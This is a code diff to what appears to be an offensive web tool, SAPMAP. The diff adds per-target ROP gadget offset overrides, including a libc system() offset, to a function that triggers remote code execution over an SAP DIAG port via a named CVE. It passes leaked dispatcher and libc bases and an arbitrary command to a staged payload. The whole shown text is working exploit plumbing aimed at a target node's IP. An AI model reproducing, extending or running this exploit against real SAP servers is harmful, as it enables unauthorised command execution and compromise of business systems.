@@ -8027,6 +8027,14 @@ def create_app(api: SAPMAPApi) -> Bottle:
         libc_hex = (data.get("libc_base_hex") or "").strip()
         rdx_hex  = (data.get("rdx_hex")        or "").strip()
         auto_cap = data.get("auto_capture", True)
+        # Optional per-target gadget offset overrides.  Empty → use
+        # Julian's defaults (kernel 7.93 PL101 + glibc 2.31).  Any
+        # non-empty value replaces the corresponding module constant
+        # for this one call — use tools/cve-2026-44756/find_gadgets.py
+        # on the target to extract the values.
+        s1_off_hex = (data.get("stage1_dw_off_hex")   or "").strip()
+        s2_off_hex = (data.get("stage2_libc_off_hex") or "").strip()
+        sy_off_hex = (data.get("system_libc_off_hex") or "").strip()
 
         # DIAG port: use the node's dispatcher if we know it, else 3200.
         # `node.instances` is a list of InstanceInfo dataclasses (not
@@ -8159,9 +8167,26 @@ def create_app(api: SAPMAPApi) -> Bottle:
                       f"the crash reading).")
                 return
 
+            s1_off = _parse_hex("stage1_dw_off_hex", s1_off_hex) or None
+            s2_off = _parse_hex("stage2_libc_off_hex", s2_off_hex) or None
+            sy_off = _parse_hex("system_libc_off_hex", sy_off_hex) or None
+            if s1_off is not None or s2_off is not None or sy_off is not None:
+                from sap_cve_2026_44756_diag import (
+                    STAGE1_DW_OFF as _D1, STAGE2_LIBC_OFF as _D2,
+                    SYSTEM_LIBC_OFF as _D3)
+                print(f"[*] {sid}: gadget offsets — "
+                      f"stage1_dw={s1_off if s1_off else _D1:#x}"
+                      f"{' (override)' if s1_off else ' (default)'}, "
+                      f"stage2_libc={s2_off if s2_off else _D2:#x}"
+                      f"{' (override)' if s2_off else ' (default)'}, "
+                      f"system_libc={sy_off if sy_off else _D3:#x}"
+                      f"{' (override)' if sy_off else ' (default)'}")
             res = trigger_diag_rce(node.ip, diag_port,
                                      dw_base, libc_base, rdx,
-                                     command)
+                                     command,
+                                     stage1_dw_off=s1_off,
+                                     stage2_libc_off=s2_off,
+                                     system_libc_off=sy_off)
             print(f"[*] {sid}: payload {res['passport_len']}B, "
                   f"stage1 RIP {res['stage1']:#x}, "
                   f"stage2 {res['stage2']:#x}, "
